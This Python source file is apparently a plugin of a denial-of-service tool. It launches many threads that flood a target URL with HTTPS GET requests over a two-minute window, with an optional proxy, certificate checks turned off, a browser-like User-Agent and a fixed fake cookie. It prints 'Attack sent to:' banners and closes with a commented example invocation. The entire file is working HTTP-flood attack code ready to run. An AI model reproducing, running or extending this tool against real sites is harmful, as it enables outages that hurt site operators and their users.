# plugins/basic_tls_v1.py
import threading
import requests
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def send_req_basic_tls_v1(url, packet, results, proxies, headers):
    session = requests.Session()
    
    for _ in range(packet):
        try:
            response = session.get(url, headers=headers, proxies=proxies, verify=False, timeout=5)
            results.append(f"GET {url} STATUS CODE {response.status_code}")
        except requests.exceptions.ConnectTimeout:
            results.append(f"GET {url} CONNECTION TIMEOUT")
        except requests.exceptions.RequestException as e:
            results.append(f"GET {url} ERROR: {e}")

def run_threads_basic_tls_v1(url, packets, threads, results, proxies, headers):
    thread_list = []
    
    for _ in range(threads):
        thread = threading.Thread(target=send_req_basic_tls_v1, args=(url, packets, results, proxies, headers))
        thread_list.append(thread)
        thread.start()

    for thread in thread_list:
        thread.join()

def send_requests_with_timeout_basic_tls_v1(url, packets, threads, timeout=120, proxy=None):
    results = []
    start_time = time.time()

    proxies = {
        "http": proxy,
        "https": proxy
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Cookie': 'sessionid=123456789; token=abcdef123456'
    }
    
    print(f"Attack sent to:\nUrl: {url}\nPackets: {packets}\nTimeout: {timeout} (2 Min)\nUsing Proxy: {proxy if proxy else 'No proxy'}")

    run_threads_basic_tls_v1(url, packets, threads, results, proxies, headers)

    elapsed_time = time.time() - start_time
    if elapsed_time < timeout:
        time.sleep(timeout - elapsed_time)

    for result in results:
        print(result)

# send_requests_with_timeout_basic_tls_v1("https://example.com", packets=50, threads=50, proxy="http://myproxy:3128")
